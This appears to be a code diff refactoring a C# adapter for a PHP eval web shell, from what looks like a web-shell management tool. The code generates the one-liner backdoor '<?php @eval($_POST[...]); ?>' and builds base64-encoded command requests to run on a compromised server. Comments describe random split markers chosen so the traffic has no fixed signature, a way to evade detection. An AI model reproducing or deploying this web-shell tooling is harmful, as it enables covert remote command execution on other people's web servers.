@@ -10,44 +10,25 @@ namespace Rod.Transport.WebShells;
 /// one-liner being universal, not from following anyone's product). Each
 /// request builds its own wrapper -- the connection parameter carries
 /// <c>@eval(@base64_decode($_POST['&lt;random&gt;']))</c>, the random
-/// parameter carries the base64 payload, and the payload frames its
-/// answer with random marker halves around a base64-encoded body. The
-/// wire is the classic managers' shape; only the placed one-liner is
-/// baked in beyond the parameter name.
+/// parameter carries the base64 payload, and the payload frames its answer
+/// with the family's marker halves around a base64-encoded body.
 ///
 /// The command runs through the standard, documented process functions --
 /// a PATH setup for both OS families and a read pipe, the plain shape the
 /// family's template uses. No function-fallback chains and no bypass
 /// logic: those belong to out-of-tree tradecraft (architecture.md Sec 13).
 /// </summary>
-public sealed class EvalPhpAdapter : IWebShellProtocolAdapter
+public sealed class EvalPhpAdapter : EvalWebShellAdapterBase
 {
-    public string Id => "eval-php";
-    public string ScriptLanguage => "php";
-    public string DefaultEncoder => "base64";
-    public string DefaultDecoder => "base64";
+    public override string Id => "eval-php";
+    public override string ScriptLanguage => "php";
 
-    public string GenerateCredential() => WebShellAdapters.RandomToken(6, 12);
+    protected override (string Prefix, string Suffix) PasswordLiteral => ("$_POST['", "']");
 
-    public bool IsValidCredential(string credential)
-        => credential.Length is >= 6 and <= 32 && !credential.Contains(' ');
-
-    public string CredentialHint => "a short token without spaces";
-
-    public string RenderScript(string password)
+    public override string RenderScript(string password)
         => $"<?php @eval($_POST['{password}']); ?>";
 
-    public string? ReadCredentialFromScript(string script)
-    {
-        var start = script.IndexOf("$_POST['", StringComparison.Ordinal);
-        if (start < 0)
-            return null;
-        var from = start + "$_POST['".Length;
-        var end = script.IndexOf("']", from, StringComparison.Ordinal);
-        return end < 0 ? null : script[from..end];
-    }
-
-    public WebShellRequest EncodeCommand(
+    public override WebShellRequest EncodeCommand(
         string url,
         string password,
         string encoder,
@@ -59,9 +40,6 @@ public sealed class EvalPhpAdapter : IWebShellProtocolAdapter
         if (decoder is not ("base64" or "default"))
             throw new NotSupportedException($"The {Id} adapter implements the base64 and default decoders, not '{decoder}'.");
 
-        // The markers are random per request, each echoed as two
-        // concatenated halves so the wrapper itself carries no fixed
-        // signature -- the family's own traffic shape.
         var tagStart = WebShellAdapters.RandomToken(6, 12);
         var tagEnd = WebShellAdapters.RandomToken(6, 12);
         var payloadVariable = WebShellAdapters.RandomToken(8, 14);
@@ -92,37 +70,4 @@ public sealed class EvalPhpAdapter : IWebShellProtocolAdapter
         };
         return new WebShellRequest(url, form, tagStart, tagEnd, password);
     }
-
-    public string? DecodeResponse(WebShellRequest request, string decoder, ReadOnlySpan<char> body)
-    {
-        var start = body.IndexOf(request.TagStart);
-        if (start < 0)
-            return null;
-        var afterStart = start + request.TagStart.Length;
-        var end = body.Slice(afterStart).IndexOf(request.TagEnd);
-        if (end < 0)
-            return null;
-
-        var encoded = body.Slice(afterStart, end).Trim();
-        if (decoder != "base64")
-            return encoded.ToString();
-
-        try
-        {
-            return Encoding.UTF8.GetString(Convert.FromBase64String(encoded.ToString()));
-        }
-        catch (FormatException)
-        {
-            // The markers matched but the body between them is not the
-            // base64 this decoder expects -- an endpoint answering a
-            // different protocol shape.
-            return null;
-        }
-    }
-
-    // The two halves of a marker: split at the middle so the payload's own
-    // text never contains the marker whole.
-    private static string Half(string tag) => tag[..(tag.Length / 2)];
-
-    private static string HalfBack(string tag) => tag[(tag.Length / 2)..];
 }
